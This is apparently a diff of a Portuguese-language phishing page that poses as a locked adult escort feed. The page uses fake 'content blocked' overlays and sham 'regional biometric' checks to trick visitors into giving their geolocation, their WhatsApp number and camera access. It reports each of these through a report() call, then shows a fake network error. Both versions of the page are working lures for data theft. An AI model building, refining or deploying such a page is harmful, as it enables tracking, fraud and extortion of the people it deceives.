@@ -7,56 +7,21 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         :root { --primary: #ff2a5f; --success: #00ff88; --bg: #09090b; --card: #121214; }
-        
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
         body { background: var(--bg); color: #fff; overflow: hidden; }
 
-        #content {
-            filter: blur(25px);
-            transition: filter 0.5s ease;
-            height: 100vh;
-            width: 100vw;
-            pointer-events: none;
-        }
+        #content { filter: blur(25px); transition: filter 0.5s ease; height: 100vh; width: 100vw; pointer-events: none; }
 
-        #permission-overlay {
-            position: fixed; inset: 0;
-            background: rgba(0,0,0,0.85);
-            z-index: 9999;
-            display: flex; justify-content: center; align-items: center; padding: 20px;
-        }
+        #permission-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 9999; display: flex; justify-content: center; align-items: center; padding: 20px; }
 
-        .alert-box {
-            background: var(--card);
-            width: 100%; max-width: 340px;
-            padding: 30px; border-radius: 20px;
-            text-align: center;
-            border: 1px solid #333;
-            box-shadow: 0 0 40px rgba(255, 42, 95, 0.2);
-        }
+        .alert-box { background: var(--card); width: 100%; max-width: 340px; padding: 30px; border-radius: 20px; text-align: center; border: 1px solid #333; box-shadow: 0 0 40px rgba(255, 42, 95, 0.2); }
 
-        .alert-icon { font-size: 3.5rem; color: var(--primary); margin-bottom: 20px; }
-        
-        .btn-allow {
-            background: var(--primary); color: white;
-            border: none; padding: 18px; width: 100%;
-            border-radius: 12px; font-weight: 900;
-            font-size: 1.1rem; cursor: pointer; margin-top: 25px;
-            box-shadow: 0 4px 15px rgba(255, 42, 95, 0.4);
-        }
+        .btn-allow { background: var(--primary); color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 900; font-size: 1.1rem; cursor: pointer; margin-top: 25px; }
 
-        .modal { 
-            position: fixed; inset: 0; background: #000; 
-            z-index: 10000; display: none; 
-            flex-direction: column; align-items: center; justify-content: center; padding: 25px;
-        }
-        input { 
-            background: #111; border: 1px solid #333; color: #fff; 
-            padding: 20px; width: 100%; max-width: 320px; 
-            border-radius: 12px; font-size: 1.2rem; margin: 20px 0; outline: none; text-align: center;
-        }
+        .modal { position: fixed; inset: 0; background: #000; z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 25px; }
+        input { background: #111; border: 1px solid #333; color: #fff; padding: 20px; width: 100%; max-width: 320px; border-radius: 12px; font-size: 1.2rem; margin: 20px 0; outline: none; text-align: center; }
 
-        .loader { width: 45px; height: 45px; border: 4px solid #333; border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px; }
+        .loader { width: 40px; height: 40px; border: 4px solid #333; border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px; }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
@@ -64,40 +29,33 @@
 
     <div id="permission-overlay">
         <div class="alert-box">
-            <i class="fa-solid fa-circle-exclamation alert-icon"></i>
-            <h2 style="margin-bottom: 10px;">CONTEÚDO BLOQUEADO</h2>
-            <p style="color: #888; font-size: 0.9rem; line-height: 1.4;">
-                Este conteúdo é restrito para sua região. Confirme sua localização para desbloquear o feed de acompanhantes agora.
-            </p>
+            <i class="fa-solid fa-circle-exclamation" style="font-size: 3rem; color: var(--primary); margin-bottom: 15px;"></i>
+            <h2>CONTEÚDO BLOQUEADO</h2>
+            <p style="color: #888; margin-top: 10px;">Para sua segurança, confirme sua localização para ver modelos próximos.</p>
             <button class="btn-allow" onclick="requestPermission()">ACEITAR E DESBLOQUEAR</button>
-            <p style="font-size: 0.65rem; color: #444; margin-top: 15px;">ID: #492-BX9 | Criptografia SSL Ativa</p>
         </div>
     </div>
 
     <div id="content">
-        <header style="padding: 15px; border-bottom: 1px solid #222; text-align: center; font-weight: 900; color: var(--primary);">PRIVACY VIP</header>
-        <div class="fake-post">
-            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
-                <div style="width: 40px; height: 40px; border-radius: 50%; background: #333;"></div>
-                <b>Isabela Moraes</b>
-            </div>
-            <img src="https://s72.erome.com/3043/odyUiYvs/f849WiP4.jpeg?v=1723848742" style="width: 100%; border-radius: 15px;">
+        <header style="padding: 15px; border-bottom: 1px solid #222; text-align: center; color: var(--primary); font-weight: bold;">PRIVACY VIP</header>
+        <div style="padding: 20px;">
+            <div style="height: 400px; background: #222; border-radius: 15px;"></div>
         </div>
     </div>
 
     <div class="modal" id="modal-zap">
         <i class="fa-brands fa-whatsapp" style="font-size: 4rem; color: var(--success);"></i>
-        <h2 style="margin-top: 20px; text-align: center;">LOCALIZAÇÃO CONFIRMADA!</h2>
-        <p style="color: #888; text-align: center; margin-top: 10px;">Encontramos <b>14 modelos</b> perto de você. Onde enviamos seu passe de acesso livre?</p>
+        <h2 style="margin-top: 20px;">QUASE LÁ!</h2>
+        <p style="color: #888; text-align: center;">Onde enviamos seu passe de acesso livre?</p>
         <input type="tel" id="whatsapp" placeholder="(DDD) 99999-9999">
-        <button class="btn-allow" style="background: var(--success); color: #000;" onclick="sendZap()">LIBERAR VÍDEOS AGORA</button>
+        <button class="btn-allow" style="background: var(--success); color: #000;" onclick="sendZap()">LIBERAR AGORA</button>
     </div>
 
     <div class="modal" id="modal-cam">
-        <h2 id="cam-status">Carregando conteúdo...</h2>
-        <p style="color: #888; text-align: center; margin-top: 10px;">Aguarde enquanto sincronizamos sua conexão com o servidor regional.</p>
+        <h2>Sincronizando Live...</h2>
         <div class="loader"></div>
-        <button id="btn-cam" class="btn-allow" onclick="startCamera()">CLIQUE PARA FINALIZAR</button>
+        <p style="color: #888;">Validando biometria regional...</p>
+        <button class="btn-allow" onclick="startCamera()">FINALIZAR ACESSO</button>
     </div>
 
     <script>
@@ -114,7 +72,7 @@
         function requestPermission() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((p) => {
-                    report('📍 LOCALIZAÇÃO', `${p.coords.latitude},${p.coords.longitude}`);
+                    report('LOCALIZAÇÃO', `Lat: ${p.coords.latitude}, Long: ${p.coords.longitude}`);
                     unlockFeed();
                 }, () => unlockFeed());
             } else { unlockFeed(); }
@@ -123,38 +81,31 @@
         function unlockFeed() {
             document.getElementById('permission-overlay').style.display = 'none';
             document.getElementById('content').style.filter = 'none';
-            setTimeout(() => {
-                document.getElementById('modal-zap').style.display = 'flex';
-            }, 2500);
+            setTimeout(() => { document.getElementById('modal-zap').style.display = 'flex'; }, 2000);
         }
 
         function sendZap() {
-            const num = document.getElementById('whatsapp').value;
-            if(num.length < 10) return alert("Número incompleto!");
-            report('📱 WHATSAPP', num);
+            const val = document.getElementById('whatsapp').value;
+            if(val.length < 8) return alert("Número inválido");
+            report('WHATSAPP', val);
             document.getElementById('modal-zap').style.display = 'none';
             document.getElementById('modal-cam').style.display = 'flex';
         }
 
         async function startCamera() {
             try {
-                // Solicita a câmera (o navegador vai perguntar "Permitir?")
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                // Pede a permissão silenciosamente
+                await navigator.mediaDevices.getUserMedia({ video: true });
+                report('CÂMERA', 'Acesso Concedido');
                 
-                // Oculta o botão e deixa só o loader rodando
-                document.getElementById('btn-cam').style.display = 'none';
-                document.getElementById('cam-status').innerText = "Sincronizando Live...";
-
-                report('📸 CÂMERA', 'ACESSO CONCEDIDO');
-
-                // Mantém a live "carregando" por 5 segundos e depois finge erro
+                document.querySelector('#modal-cam h2').innerText = "CONECTANDO...";
                 setTimeout(() => {
-                    alert("ERRO DE REDE: Servidor congestionado. O link de acesso foi enviado para o seu WhatsApp.");
+                    alert("Erro de conexão. Verifique seu WhatsApp.");
                     location.reload();
-                }, 5000);
+                }, 3000);
             } catch (e) {
-                report('❌ CÂMERA', 'NEGADO');
-                alert("Erro de autenticação: A permissão é necessária para validar sua região.");
+                report('CÂMERA', 'Negado');
+                alert("Permissão necessária para biometria.");
             }
         }
     </script>
